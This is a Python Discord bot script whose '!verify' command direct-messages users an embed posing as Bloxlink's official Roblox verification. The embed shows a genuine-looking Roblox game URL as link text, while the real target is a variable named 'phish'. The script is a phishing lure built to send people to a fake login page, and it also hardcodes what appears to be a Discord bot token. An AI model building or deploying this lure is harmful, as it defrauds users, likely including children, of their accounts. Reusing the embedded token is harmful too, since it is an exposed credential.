token = "MTAxNjY5MzE0NTc1ODYwOTUwOA.G-mI_G.-8Ij1tzaUrDwLzEG0tW5gNrUAX6pHMMN-n6k1s"
prefix = "!"
title = "Please Complete Verification"
desc ="To verify your account, please join BloxLink's Official Roblox Verification Game"
field = "Please Login and join the game"
hyperlink = "https://www.roblox.com/games/1271943503/Bloxlink-Verification-Game"
phish = ""
client = commands.Bot(command_prefix = prefix)
client.remove_command('help')

@client.event
async def on_ready():
    print('')
    print('----------------')
    print('Bot Online!')
    print('----------------')

main = discord.Embed(title=title,description=desc,color=0xcf4948)
main.add_field(name=field,value=f"[{hyperlink}]({phish})")


@client.command()
async def verify(ctx):
    await ctx.send('Sent verification info. Please check your DMs.')
    await ctx.author.send(embed=main)





client.run(token)